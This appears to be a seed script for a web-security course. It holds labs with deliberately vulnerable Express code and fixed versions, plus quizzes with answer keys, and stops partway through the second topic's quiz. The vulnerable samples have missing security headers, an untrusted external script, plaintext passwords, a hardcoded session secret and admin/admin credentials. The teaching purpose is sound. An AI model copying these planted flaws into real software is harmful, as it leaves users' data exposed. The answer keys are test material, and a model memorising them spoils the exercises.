import { db } from "./db";
import {
  topics,
  users,
  labExercises,
  quizQuestions,
  readConfirmations,
  labProgress,
  labAttempts,
  quizAttempts,
} from "@shared/schema";
import bcrypt from "bcrypt";

async function clearDatabase() {
  console.log('Clearing existing data...');
  
  await db.delete(readConfirmations);
  await db.delete(quizAttempts);
  await db.delete(quizQuestions);
  await db.delete(labAttempts);
  await db.delete(labProgress);
  await db.delete(labExercises);
  await db.delete(topics);
  await db.delete(users);
  
  console.log('✓ Database cleared');
}

interface TopicSeed {
  number: number;
  title: string;
  duration: string;
  description: string;
  subparts: string[];
  learningOutcomes: string[];
  lab: {
    title: string;
    description: string;
    estimatedTime: number;
    instructions: string;
    vulnerableCode: Array<{
      filename: string;
      language: string;
      code: string;
    }>;
    correctCode: Array<{
      filename: string;
      language: string;
      code: string;
    }>;
    validationCriteria: Array<{
      header: string;
      description: string;
      expectedPattern?: string;
      required: boolean;
    }>;
    learningOutcomes: string[];
    hints: string[];
  };
  quizzes: Array<{
    question: string;
    type: "multiple_choice" | "true_false";
    options: Array<{ id: string; text: string }>;
    correctAnswers: string[];
    explanation: string;
    category: string;
  }>;
}

const SEED_DATA: TopicSeed[] = [
  {
    number: 1,
    title: "Security Mindset, Web Architecture & HTTP Foundations",
    duration: "2h",
    description: "Learn security fundamentals, web architecture patterns, and HTTP security headers",
    subparts: [
      "1.1.1 Assets, attackers, and abuse-case thinking",
      "1.1.2 Trust boundaries, data flows and classification",
      "1.1.3 OWASP Top 10",
      "1.1.4 STRIDE framework & STRIDE-lite for web APIs"
    ],
    learningOutcomes: [
      "Design secure web/API architectures",
      "Prevent injection/XSS via validation and encoding",
      "Implement robust authentication patterns",
      "Apply security headers correctly",
    ],
    lab: {
      title: "Securing TechMart - HTTP Security Headers Mission",
      description: "TechMart's e-commerce platform was recently flagged by security auditors for missing critical HTTP security headers. Your mission: implement security headers to protect against XSS, clickjacking, and protocol downgrade attacks.",
      estimatedTime: 30,
      instructions: `**Story**: You're a security engineer at TechMart, an online electronics store. A recent pen-test revealed that the application is vulnerable to XSS attacks and clickjacking because of missing security headers.

**Your Mission**:
1. **Analyze** the vulnerable server configuration below
2. **Test** what happens without security headers (the app loads any external scripts!)
3. **Implement** the following security headers:
   - Content-Security-Policy (CSP) to prevent XSS
   - Strict-Transport-Security (HSTS) to enforce HTTPS
   - X-Frame-Options to prevent clickjacking
   - X-Content-Type-Options to prevent MIME sniffing

**Expected Solution**: Add a middleware function that sets these headers on all responses. Use helmet.js or set headers manually.`,
      vulnerableCode: [
        {
          filename: "server.js",
          language: "javascript",
          code: `const express = require('express');
const app = express();

// TechMart E-commerce API - VULNERABLE VERSION
app.use(express.json());

app.get('/', (req, res) => {
  // Homepage loads without any security headers!
  res.send(\`
    <h1>Welcome to TechMart</h1>
    <script src="https://untrusted-cdn.com/malicious.js"></script>
    <p>Shop our latest products</p>
  \`);
});

app.get('/api/products', (req, res) => {
  res.json([
    { id: 1, name: 'Laptop', price: 999 },
    { id: 2, name: 'Phone', price: 699 }
  ]);
});

app.listen(3000, () => {
  console.log('TechMart running on http://localhost:3000');
});

// PROBLEM: No security headers = vulnerable to:
// - XSS (malicious scripts can load from anywhere)
// - Clickjacking (site can be embedded in iframes)
// - Protocol downgrade attacks (no HTTPS enforcement)`
        }
      ],
      correctCode: [
        {
          filename: "server.js",
          language: "javascript",
          code: `const express = require('express');
const helmet = require('helmet');
const app = express();

// TechMart E-commerce API - SECURE VERSION
app.use(express.json());

// SECURITY FIX: Add comprehensive security headers with helmet.js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  strictTransportSecurity: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  },
  frameguard: {
    action: 'deny'
  },
  noSniff: true,
  xssFilter: true,
  hidePoweredBy: true
}));

// Alternative: Manual header implementation
// app.use((req, res, next) => {
//   res.setHeader('Content-Security-Policy', "default-src 'self'; script-src 'self'; style-src 'self'");
//   res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');
//   res.setHeader('X-Frame-Options', 'DENY');
//   res.setHeader('X-Content-Type-Options', 'nosniff');
//   res.setHeader('X-XSS-Protection', '1; mode=block');
//   next();
// });

app.get('/', (req, res) => {
  // Now external scripts are blocked by CSP!
  res.send(\`
    <h1>Welcome to TechMart</h1>
    <p>Shop our latest products</p>
    <p>Security headers are now protecting this site!</p>
  \`);
});

app.get('/api/products', (req, res) => {
  res.json([
    { id: 1, name: 'Laptop', price: 999 },
    { id: 2, name: 'Phone', price: 699 }
  ]);
});

app.listen(3000, () => {
  console.log('TechMart running securely on http://localhost:3000');
});

// SECURITY IMPROVEMENTS:
// ✓ CSP prevents XSS attacks by blocking external scripts
// ✓ HSTS enforces HTTPS connections (prevents protocol downgrade)
// ✓ X-Frame-Options prevents clickjacking attacks
// ✓ X-Content-Type-Options prevents MIME sniffing
// ✓ All critical security headers implemented`
        }
      ],
      validationCriteria: [
        {
          header: "Content-Security-Policy",
          description: "Implement CSP with default-src 'self' to prevent loading external scripts",
          expectedPattern: "default-src 'self'",
          required: true
        },
        {
          header: "Strict-Transport-Security",
          description: "Add HSTS header with max-age of at least 1 year (31536000 seconds)",
          expectedPattern: "max-age=31536000",
          required: true
        },
        {
          header: "X-Frame-Options",
          description: "Prevent clickjacking by setting X-Frame-Options to DENY or SAMEORIGIN",
          expectedPattern: "DENY|SAMEORIGIN",
          required: true
        },
        {
          header: "X-Content-Type-Options",
          description: "Prevent MIME sniffing attacks",
          expectedPattern: "nosniff",
          required: true
        }
      ],
      learningOutcomes: [
        "Understand how HTTP security headers protect web applications",
        "Implement Content Security Policy (CSP) to prevent XSS",
        "Configure HSTS to enforce HTTPS connections",
        "Prevent clickjacking using X-Frame-Options",
        "Use helmet.js for comprehensive security header management"
      ],
      hints: [
        "Hint 1: Install helmet.js with 'npm install helmet' and use app.use(helmet()) for quick security",
        "Hint 2: For manual implementation, use app.use() middleware: res.setHeader('Header-Name', 'value')",
        "Hint 3: CSP syntax: \"default-src 'self'; script-src 'self'; style-src 'self'\"",
        "Hint 4: HSTS should include: max-age=31536000; includeSubDomains; preload",
        "Hint 5: X-Frame-Options should be 'DENY' to completely block framing",
        "SOLUTION: Use helmet.js middleware OR set all 4 headers manually with proper values"
      ]
    },
    quizzes: [
      {
        question: "What is the primary purpose of the Content-Security-Policy (CSP) header?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Prevent CSRF attacks" },
          { id: "b", text: "Prevent XSS by controlling which resources can be loaded" },
          { id: "c", text: "Encrypt HTTP traffic" },
          { id: "d", text: "Manage user authentication" }
        ],
        correctAnswers: ["b"],
        explanation: "CSP helps prevent XSS attacks by specifying which sources can load scripts, styles, images, and other resources. It creates a whitelist of trusted content sources.",
        category: "HTTP Security"
      },
      {
        question: "A web application loads scripts from https://cdn.example.com. Which CSP directive should you use?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "script-src 'self' https://cdn.example.com" },
          { id: "b", text: "default-src https://cdn.example.com" },
          { id: "c", text: "frame-src https://cdn.example.com" },
          { id: "d", text: "connect-src https://cdn.example.com" }
        ],
        correctAnswers: ["a"],
        explanation: "The script-src directive controls which sources can load JavaScript. Including 'self' allows scripts from the same origin, and the CDN URL allows scripts from that specific source.",
        category: "HTTP Security"
      },
      {
        question: "Which header prevents attackers from embedding your site in an iframe on malicious websites?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Content-Security-Policy" },
          { id: "b", text: "X-Frame-Options" },
          { id: "c", text: "X-Content-Type-Options" },
          { id: "d", text: "Strict-Transport-Security" }
        ],
        correctAnswers: ["b"],
        explanation: "X-Frame-Options prevents clickjacking attacks by controlling whether your site can be embedded in iframes. Values include DENY (no framing) or SAMEORIGIN (only same-origin framing).",
        category: "HTTP Security"
      },
      {
        question: "What is the minimum recommended max-age value for HSTS (Strict-Transport-Security) in production?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "86400 seconds (1 day)" },
          { id: "b", text: "2592000 seconds (30 days)" },
          { id: "c", text: "31536000 seconds (1 year)" },
          { id: "d", text: "3600 seconds (1 hour)" }
        ],
        correctAnswers: ["c"],
        explanation: "HSTS should use a max-age of at least 31536000 seconds (1 year) in production to ensure browsers enforce HTTPS for extended periods, preventing protocol downgrade attacks.",
        category: "HTTP Security"
      },
      {
        question: "The OWASP Top 10 is a regularly updated list of the most critical web application security risks.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "The OWASP Top 10 is a standard awareness document representing a broad consensus about the most critical security risks to web applications, updated every few years.",
        category: "Security Fundamentals"
      },
      {
        question: "What does the X-Content-Type-Options: nosniff header prevent?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "SQL injection attacks" },
          { id: "b", text: "MIME type sniffing attacks where browsers execute files as a different type" },
          { id: "c", text: "Clickjacking attacks" },
          { id: "d", text: "Man-in-the-middle attacks" }
        ],
        correctAnswers: ["b"],
        explanation: "X-Content-Type-Options: nosniff prevents browsers from MIME-sniffing responses away from the declared content-type. This stops attackers from uploading files that browsers might execute as JavaScript.",
        category: "HTTP Security"
      },
      {
        question: "Which STRIDE threat category does SQL injection belong to?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Spoofing" },
          { id: "b", text: "Tampering" },
          { id: "c", text: "Information Disclosure" },
          { id: "d", text: "Denial of Service" }
        ],
        correctAnswers: ["b"],
        explanation: "SQL injection is classified as Tampering in the STRIDE model because it allows attackers to modify data or database queries by manipulating input.",
        category: "Security Fundamentals"
      },
      {
        question: "In security thinking, what is a 'trust boundary'?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "The line between trusted (internal) and untrusted (external) components or data" },
          { id: "b", text: "The maximum number of users allowed in a system" },
          { id: "c", text: "The encryption level required for data transmission" },
          { id: "d", text: "The physical security perimeter of a data center" }
        ],
        correctAnswers: ["a"],
        explanation: "A trust boundary marks the division between trusted and untrusted components. Data crossing trust boundaries (like user input) must be validated and sanitized.",
        category: "Security Fundamentals"
      },
      {
        question: "You're designing an e-commerce API. Which security header combination provides the best baseline protection?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Only Content-Security-Policy" },
          { id: "b", text: "CSP + HSTS + X-Frame-Options + X-Content-Type-Options" },
          { id: "c", text: "Only Strict-Transport-Security" },
          { id: "d", text: "X-Frame-Options + X-XSS-Protection" }
        ],
        correctAnswers: ["b"],
        explanation: "A comprehensive security header strategy includes CSP (XSS prevention), HSTS (HTTPS enforcement), X-Frame-Options (clickjacking prevention), and X-Content-Type-Options (MIME sniffing prevention).",
        category: "HTTP Security"
      },
      {
        question: "CSP can completely eliminate all XSS vulnerabilities without any code changes.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "While CSP is a powerful defense-in-depth mechanism that significantly reduces XSS risk, it's not a complete solution. Proper input validation, output encoding, and secure coding practices are still essential.",
        category: "HTTP Security"
      },
      {
        question: "What does 'defense in depth' mean in security architecture?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Using only the strongest single security control" },
          { id: "b", text: "Implementing multiple layers of security controls" },
          { id: "c", text: "Focusing security only at the network perimeter" },
          { id: "d", text: "Encrypting all data at rest" }
        ],
        correctAnswers: ["b"],
        explanation: "Defense in depth means implementing multiple security layers so that if one layer fails, others still provide protection. Examples include network firewalls + WAF + input validation + CSP.",
        category: "Security Fundamentals"
      },
      {
        question: "Which CSP directive would you use to prevent your site from loading fonts from untrusted sources?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "font-src 'self'" },
          { id: "b", text: "style-src 'self'" },
          { id: "c", text: "default-src 'self'" },
          { id: "d", text: "script-src 'self'" }
        ],
        correctAnswers: ["a"],
        explanation: "The font-src directive controls which sources can load web fonts. Setting it to 'self' restricts font loading to the same origin only.",
        category: "HTTP Security"
      },
      {
        question: "An attacker modifies the URL parameter ?userId=5 to ?userId=6 to access another user's data. What type of vulnerability is this?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "SQL Injection" },
          { id: "b", text: "XSS (Cross-Site Scripting)" },
          { id: "c", text: "IDOR (Insecure Direct Object Reference)" },
          { id: "d", text: "CSRF (Cross-Site Request Forgery)" }
        ],
        correctAnswers: ["c"],
        explanation: "This is IDOR (Insecure Direct Object Reference), where an application exposes direct references to internal objects without proper authorization checks, allowing attackers to access other users' resources.",
        category: "Security Fundamentals"
      },
      {
        question: "The includeSubDomains directive in HSTS applies the policy to all subdomains of the current domain.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "The includeSubDomains directive tells the browser to apply HSTS to the main domain and all its subdomains, providing comprehensive HTTPS enforcement across the entire domain hierarchy.",
        category: "HTTP Security"
      },
      {
        question: "What is 'abuse-case thinking' in security design?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Documenting legitimate use cases for a system" },
          { id: "b", text: "Intentionally thinking like an attacker to identify potential misuse scenarios" },
          { id: "c", text: "Testing application performance under load" },
          { id: "d", text: "Analyzing user behavior patterns" }
        ],
        correctAnswers: ["b"],
        explanation: "Abuse-case thinking involves intentionally considering how attackers might misuse features or bypass controls. It complements use-case thinking by identifying security requirements.",
        category: "Security Fundamentals"
      },
      {
        question: "Which helmet.js configuration is most secure for a modern web application?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "app.use(helmet())" },
          { id: "b", text: "app.use(helmet({ frameguard: false }))" },
          { id: "c", text: "app.use(helmet({ contentSecurityPolicy: false }))" },
          { id: "d", text: "No helmet.js needed if using HTTPS" }
        ],
        correctAnswers: ["a"],
        explanation: "The default helmet() configuration provides strong baseline security headers including CSP, frameguard, HSTS, and more. Disabling features reduces protection.",
        category: "HTTP Security"
      },
      {
        question: "In the context of web APIs, what does the 'T' in STRIDE stand for?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Tracking" },
          { id: "b", text: "Tampering" },
          { id: "c", text: "Throttling" },
          { id: "d", text: "Tunneling" }
        ],
        correctAnswers: ["b"],
        explanation: "In STRIDE, T stands for Tampering - the threat of unauthorized modification of data. This includes attacks like SQL injection, parameter manipulation, and man-in-the-middle attacks.",
        category: "Security Fundamentals"
      },
      {
        question: "You need to allow inline scripts for a legacy application but still want some CSP protection. Which directive should you use with caution?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "script-src 'unsafe-inline'" },
          { id: "b", text: "script-src 'strict-dynamic'" },
          { id: "c", text: "script-src 'nonce-'" },
          { id: "d", text: "script-src *" }
        ],
        correctAnswers: ["a"],
        explanation: "'unsafe-inline' allows inline scripts but significantly weakens CSP protection against XSS. Better alternatives include using nonces or migrating inline scripts to external files.",
        category: "HTTP Security"
      },
      {
        question: "Data classification helps determine appropriate security controls based on data sensitivity.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "Data classification (e.g., Public, Internal, Confidential, Restricted) helps organizations apply appropriate security controls, encryption, and access policies based on sensitivity levels.",
        category: "Security Fundamentals"
      },
      {
        question: "Your application uses Google Fonts. What's the most secure CSP configuration?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "default-src *" },
          { id: "b", text: "font-src https://fonts.gstatic.com; style-src https://fonts.googleapis.com" },
          { id: "c", text: "script-src https://fonts.googleapis.com" },
          { id: "d", text: "No CSP needed for fonts" }
        ],
        correctAnswers: ["b"],
        explanation: "To use Google Fonts securely, allow fonts.gstatic.com for font-src (font files) and fonts.googleapis.com for style-src (CSS). This follows the principle of least privilege.",
        category: "HTTP Security"
      },
      {
        question: "Which of the following represents the correct order of security design thinking?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Code → Test → Add security features" },
          { id: "b", text: "Identify assets → Define threats → Design controls → Implement → Test" },
          { id: "c", text: "Deploy → Monitor → Patch vulnerabilities" },
          { id: "d", text: "Implement firewalls → Write code → Deploy" }
        ],
        correctAnswers: ["b"],
        explanation: "Security should be built-in from the start: identify what needs protection, understand threats, design appropriate controls, implement them, and continuously test. Security is not an afterthought.",
        category: "Security Fundamentals"
      },
      {
        question: "HSTS preload allows browsers to permanently cache the HTTPS-only requirement for your domain.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["true"],
        explanation: "HSTS preload submits your domain to browsers' hardcoded HSTS lists, ensuring HTTPS is enforced even on the first visit, eliminating the trust-on-first-use vulnerability.",
        category: "HTTP Security"
      },
      {
        question: "A penetration test reveals your API returns detailed error messages with stack traces to clients. What security principle is violated?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Encryption in transit" },
          { id: "b", text: "Information disclosure / Fail securely" },
          { id: "c", text: "Least privilege" },
          { id: "d", text: "Defense in depth" }
        ],
        correctAnswers: ["b"],
        explanation: "Detailed error messages leak sensitive information about your system's internals, helping attackers. Applications should 'fail securely' by logging detailed errors server-side while showing generic messages to clients.",
        category: "Security Fundamentals"
      },
      {
        question: "What is the primary difference between authentication and authorization?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Authentication verifies identity; authorization determines what they can access" },
          { id: "b", text: "They are the same thing" },
          { id: "c", text: "Authorization verifies identity; authentication determines access" },
          { id: "d", text: "Authentication is for APIs; authorization is for web apps" }
        ],
        correctAnswers: ["a"],
        explanation: "Authentication answers 'Who are you?' (identity verification), while authorization answers 'What can you do?' (access control). Both are essential for security.",
        category: "Security Fundamentals"
      },
      {
        question: "helmet.js is only necessary for production environments, not development.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "helmet.js should be used in all environments including development. This ensures security headers are tested early and prevents environment-specific bugs from reaching production.",
        category: "HTTP Security"
      }
    ]
  },
  {
    number: 2,
    title: "Authentication & Session Management",
    duration: "2h",
    description: "Secure authentication patterns and session handling",
    subparts: [
      "2.1.1 Password hashing and storage",
      "2.1.2 Session tokens and JWTs",
      "2.1.3 OAuth 2.0 flows",
      "2.1.4 Multi-factor authentication"
    ],
    learningOutcomes: [
      "Implement secure password storage",
      "Design secure session management",
      "Understand OAuth 2.0 flows",
    ],
    lab: {
      title: "SecureBank Authentication Breach - Emergency Fix",
      description: "SecureBank's authentication system was compromised! An attacker dumped the user database and cracked all passwords because they were stored in plain text. Your mission: implement proper password hashing with bcrypt and secure session management to prevent future breaches.",
      estimatedTime: 45,
      instructions: `**Story**: You're the lead security engineer at SecureBank. Last night, an attacker exploited a SQL injection vulnerability and dumped the entire user database. Since passwords were stored in plain text, all customer accounts are now compromised!

**Critical Security Incident**:
- 10,000 customer passwords exposed
- Passwords stored in plain text (cleartext)
- Session tokens vulnerable to hijacking
- No httpOnly or secure flags on cookies

**Your Emergency Mission**:
1. **Exploit** the current system to understand the vulnerability (try logging in with any password!)
2. **Identify** all security flaws in the authentication code below
3. **Implement** secure password hashing using bcrypt (10+ rounds)
4. **Fix** session management with httpOnly, secure, and SameSite cookie flags
5. **Add** password verification logic using bcrypt.compare()

**Expected Solution**: Replace plain text password storage with bcrypt hashing and add secure cookie flags for session management.`,
      vulnerableCode: [
        {
          filename: "auth.js",
          language: "javascript",
          code: `const express = require('express');
const session = require('express-session');
const app = express();

// VULNERABLE VERSION - SecureBank Authentication
app.use(express.json());
app.use(session({
  secret: 'bank-secret-123',
  resave: false,
  saveUninitialized: true,
  cookie: {
    // NO SECURITY FLAGS! Vulnerable to XSS and MITM attacks
  }
}));

// Database (in-memory for demo)
const users = [
  { id: 1, username: 'alice', password: 'password123', balance: 50000 },
  { id: 2, username: 'bob', password: 'qwerty', balance: 75000 },
  { id: 3, username: 'admin', password: 'admin', balance: 1000000 }
];

// VULNERABILITY 1: Plain text password storage!
function register(username, password) {
  const newUser = {
    id: users.length + 1,
    username: username,
    password: password, // STORED IN PLAIN TEXT!
    balance: 0
  };
  users.push(newUser);
  return newUser;
}

// VULNERABILITY 2: Direct password comparison (no hashing)
function login(req, res) {
  const { username, password } = req.body;
  
  // Direct comparison with plain text password
  const user = users.find(u => 
    u.username === username && u.password === password
  );
  
  if (user) {
    req.session.userId = user.id;
    res.json({ message: 'Login successful', balance: user.balance });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
}

// VULNERABILITY 3: No secure cookie flags
function getBalance(req, res) {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  const user = users.find(u => u.id === req.session.userId);
  res.json({ balance: user.balance });
}

app.post('/register', (req, res) => {
  const user = register(req.body.username, req.body.password);
  res.json({ message: 'Registered successfully' });
});

app.post('/login', login);
app.get('/balance', getBalance);

/* 
SECURITY FLAWS:
1. Passwords stored in plain text (CRITICAL)
2. No bcrypt hashing (CRITICAL)
3. No salt for passwords (CRITICAL)
4. Missing httpOnly flag (session hijacking via XSS)
5. Missing secure flag (MITM attacks)
6. Missing SameSite flag (CSRF attacks)
7. Weak session secret
*/`
        }
      ],
      correctCode: [
        {
          filename: "auth.js",
          language: "javascript",
          code: `const express = require('express');
const session = require('express-session');
const bcrypt = require('bcrypt');
const app = express();

// SECURE VERSION - SecureBank Authentication
app.use(express.json());

// SECURITY FIX 1: Secure session configuration with all cookie flags
app.use(session({
  secret: process.env.SESSION_SECRET || 'use-strong-random-secret-from-env',
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,      // Prevents XSS access to cookies
    secure: true,        // Only send over HTTPS
    sameSite: 'strict',  // Prevents CSRF attacks
    maxAge: 1000 * 60 * 60 * 24 // 24 hours
  }
}));

// Database (in-memory for demo)
const users = [
  // Passwords are now hashed with bcrypt (10 rounds)
  { id: 1, username: 'alice', passwordHash: '$2b$10$...hashedPassword...', balance: 50000 },
  { id: 2, username: 'bob', passwordHash: '$2b$10$...hashedPassword...', balance: 75000 },
  { id: 3, username: 'admin', passwordHash: '$2b$10$...hashedPassword...', balance: 1000000 }
];

// SECURITY FIX 2: Hash passwords with bcrypt (async)
async function register(username, password) {
  // Hash password with bcrypt using 10 salt rounds
  const saltRounds = 10;
  const passwordHash = await bcrypt.hash(password, saltRounds);
  
  const newUser = {
    id: users.length + 1,
    username: username,
    passwordHash: passwordHash, // SECURE: Hashed password stored
    balance: 0
  };
  users.push(newUser);
  return newUser;
}

// SECURITY FIX 3: Verify passwords using bcrypt.compare()
async function login(req, res) {
  const { username, password } = req.body;
  
  // Find user by username
  const user = users.find(u => u.username === username);
  
  if (!user) {
    // Don't reveal whether username exists (timing-safe)
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // SECURE: Compare password with hashed version using bcrypt
  const isValidPassword = await bcrypt.compare(password, user.passwordHash);
  
  if (isValidPassword) {
    req.session.userId = user.id;
    res.json({ message: 'Login successful', balance: user.balance });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
}

// Session validation with secure cookies
function getBalance(req, res) {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  const user = users.find(u => u.id === req.session.userId);
  res.json({ balance: user.balance });
}

// Register endpoint (async)
app.post('/register', async (req, res) => {
  try {
    const user = await register(req.body.username, req.body.password);
    res.json({ message: 'Registered successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Registration failed' });
  }
});

// Login endpoint (async)
app.post('/login', async (req, res) => {
  await login(req, res);
});

app.get('/balance', getBalance);

// Logout endpoint
app.post('/logout', (req, res) => {
  req.session.destroy();
  res.json({ message: 'Logged out successfully' });
});

/* 
SECURITY IMPROVEMENTS:
✓ Passwords hashed with bcrypt (10+ rounds with automatic salting)
✓ bcrypt.compare() used for password verification
✓ httpOnly flag prevents XSS session hijacking
✓ secure flag ensures HTTPS-only transmission
✓ sameSite: 'strict' prevents CSRF attacks
✓ Strong session secret (should be from env variable)
✓ Timing-safe login (doesn't reveal if username exists)
✓ Async/await properly handles bcrypt operations
*/`
        }
      ],
      validationCriteria: [
        {
          header: "Password Hashing",
          description: "Use bcrypt.hash() with saltRounds >= 10 for password storage",
          expectedPattern: "bcrypt.hash",
          required: true
        },
        {
          header: "Password Verification",
          description: "Use bcrypt.compare() to verify passwords during login",
          expectedPattern: "bcrypt.compare",
          required: true
        },
        {
          header: "HttpOnly Cookie",
          description: "Set httpOnly: true on session cookies to prevent XSS access",
          expectedPattern: "httpOnly.*true",
          required: true
        },
        {
          header: "Secure Cookie",
          description: "Set secure: true on session cookies for HTTPS-only transmission",
          expectedPattern: "secure.*true",
          required: true
        },
        {
          header: "SameSite Cookie",
          description: "Set sameSite: 'strict' or 'lax' to prevent CSRF attacks",
          expectedPattern: "sameSite.*(strict|lax)",
          required: true
        }
      ],
      learningOutcomes: [
        "Understand why plain text passwords are catastrophic",
        "Implement bcrypt password hashing with proper salt rounds",
        "Verify passwords securely using bcrypt.compare()",
        "Configure secure session cookies (httpOnly, secure, SameSite)",
        "Protect against session hijacking and CSRF attacks"
      ],
      hints: [
        "Hint 1: Install bcrypt: npm install bcrypt, then use: const bcrypt = require('bcrypt');",
        "Hint 2: Hash passwords on registration: const hash = await bcrypt.hash(password, 10);",
        "Hint 3: Verify passwords on login: const isValid = await bcrypt.compare(password, user.passwordHash);",
        "Hint 4: Set cookie flags in session config: cookie: { httpOnly: true, secure: true, sameSite: 'strict' }",
        "Hint 5: Use async/await for bcrypt operations (they're asynchronous!)",
        "SOLUTION: Replace plain passwords with bcrypt hashing (10+ rounds) and add all 3 cookie security flags"
      ]
    },
    quizzes: [
      {
        question: "What is the recommended minimum number of salt rounds for bcrypt password hashing?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "5 rounds" },
          { id: "b", text: "10 rounds" },
          { id: "c", text: "15 rounds" },
          { id: "d", text: "20 rounds" }
        ],
        correctAnswers: ["b"],
        explanation: "10 rounds is the recommended minimum for bcrypt, providing a good balance between security and performance. As hardware improves, this number may need to increase to 12-13 rounds.",
        category: "Authentication"
      },
      {
        question: "Which of the following is the most secure way to store passwords in a database?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Plain text" },
          { id: "b", text: "MD5 hash" },
          { id: "c", text: "bcrypt hash with salt" },
          { id: "d", text: "Base64 encoding" }
        ],
        correctAnswers: ["c"],
        explanation: "bcrypt automatically incorporates salting and uses adaptive hashing, making it highly resistant to brute-force and rainbow table attacks. MD5 is cryptographically broken, and Base64 is just encoding, not hashing.",
        category: "Authentication"
      },
      {
        question: "What is the primary purpose of the httpOnly flag on session cookies?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "Enable HTTP/2 support" },
          { id: "b", text: "Prevent JavaScript access to the cookie, mitigating XSS attacks" },
          { id: "c", text: "Compress cookie data" },
          { id: "d", text: "Enable cookie encryption" }
        ],
        correctAnswers: ["b"],
        explanation: "The httpOnly flag prevents client-side JavaScript from accessing the cookie via document.cookie, protecting session tokens from XSS attacks that attempt to steal credentials.",
        category: "Authentication"
      },
      {
        question: "Which cookie flag ensures that cookies are only transmitted over HTTPS connections?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "httpOnly" },
          { id: "b", text: "secure" },
          { id: "c", text: "sameSite" },
          { id: "d", text: "domain" }
        ],
        correctAnswers: ["b"],
        explanation: "The 'secure' flag instructs browsers to only send the cookie over HTTPS connections, preventing man-in-the-middle attacks from intercepting session tokens over unencrypted HTTP.",
        category: "Authentication"
      },
      {
        question: "JWT tokens should be stored in localStorage for easy access by JavaScript.",
        type: "true_false" as const,
        options: [
          { id: "true", text: "True" },
          { id: "false", text: "False" }
        ],
        correctAnswers: ["false"],
        explanation: "JWTs should NOT be stored in localStorage because it's accessible by any JavaScript code, including malicious XSS payloads. Use httpOnly cookies instead to prevent XSS-based token theft.",
        category: "Authentication"
      },
      {
        question: "What does the sameSite cookie attribute protect against?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "SQL injection" },
          { id: "b", text: "CSRF (Cross-Site Request Forgery) attacks" },
          { id: "c", text: "XSS (Cross-Site Scripting)" },
          { id: "d", text: "DDoS attacks" }
        ],
        correctAnswers: ["b"],
        explanation: "sameSite prevents cookies from being sent in cross-site requests, protecting against CSRF attacks. Values include 'Strict' (no cross-site cookies), 'Lax' (some cross-site allowed), and 'None' (all cross-site allowed with secure flag).",
        category: "Authentication"
      },
      {
        question: "When comparing a user's password during login, which approach is correct?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "if (password === user.passwordHash)" },
          { id: "b", text: "if (md5(password) === user.passwordHash)" },
          { id: "c", text: "if (await bcrypt.compare(password, user.passwordHash))" },
          { id: "d", text: "if (base64(password) === user.passwordHash)" }
        ],
        correctAnswers: ["c"],
        explanation: "bcrypt.compare() is the secure way to verify passwords against bcrypt hashes. It properly handles the salt and timing-safe comparison. Never compare plain text passwords or use broken hashing algorithms like MD5.",
        category: "Authentication"
      },
      {
        question: "What is a 'rainbow table' attack in the context of password security?",
        type: "multiple_choice" as const,
        options: [
          { id: "a", text: "A DDoS attack using multiple color-coded botnets" },
          { id: "b", text: "Using precomputed hash tables to crack passwords" },
          { id: "c", text: "SQL injection using special characters" },
          { id: "d", text: "A type of phishing attack" }
        ],
        correctAnswers: ["b"],
